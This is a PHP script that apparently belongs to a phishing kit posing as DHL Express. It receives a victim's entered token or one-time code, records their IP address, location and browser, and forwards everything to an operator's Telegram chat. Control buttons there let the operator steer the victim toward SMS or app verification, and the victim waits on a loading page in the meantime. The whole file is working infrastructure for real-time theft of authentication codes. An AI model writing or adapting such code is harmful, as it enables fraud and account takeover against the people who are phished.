<?php
// SEND TOKEN ERROR DATA TO TELEGRAM
require_once(__DIR__ . '/../config.php');
require_once(__DIR__ . '/../includes/get-country.php');

header('Content-Type: application/json');

$input = json_decode(file_get_contents('php://input'), true);
$token = $input['token'] ?? '';
$data = $input['data'] ?? [];

if (empty($token)) {
    echo json_encode(['success' => false]);
    exit;
}

// Get IP and country
$ip = $_SERVER['REMOTE_ADDR'];
$country = getCountryFromIP($ip);
$shortId = substr($token, 3); // Get all chars after SPT/TKN

// Build message with buttons
$message = "📦 • DHL Express: {$shortId}\n\n";
$message .= "❁═══∘◦ ❌ TOKEN ERROR ◦∘═══❁\n\n";
$message .= "🔐 Token Code : " . ($data['tokenCode'] ?? 'N/A') . "\n\n";
$message .= "❁═══∘◦❁∘═══∘❁◦∘═══❁\n\n";
$message .= "📡 Adresse Ip : {$ip}\n";
$message .= "🌆 City : {$country}\n";
$message .= "🌐 Country : {$country}\n";
$message .= "🤖 User-agent : " . ($_SERVER['HTTP_USER_AGENT'] ?? 'Unknown') . "\n\n";
$message .= "👇 Token was wrong, where to send user?";

// Add control buttons (AFTER panel - has all options)
$keyboard = [
    'inline_keyboard' => [
        [
            ['text' => '✅ Done', 'callback_data' => "action_{$token}_done"],
            ['text' => '❌ Token Error', 'callback_data' => "action_{$token}_tokenerror"]
        ],
        [
            ['text' => '📱 SMS', 'callback_data' => "action_{$token}_sms"],
            ['text' => '📲 App', 'callback_data' => "action_{$token}_app"]
        ],
        [
            ['text' => '🚫 Ban IP', 'callback_data' => "ban_{$token}_{$ip}"]
        ]
    ]
];
// Send to Telegram
$result = sendTelegramMessage($message, $keyboard);

// Keep user on loading page (waiting for admin command) WITH TOKEN
echo json_encode([
    'success' => $result['ok'],
    'redirect' => '../loading.php?token=' . urlencode($token)
]);
?>
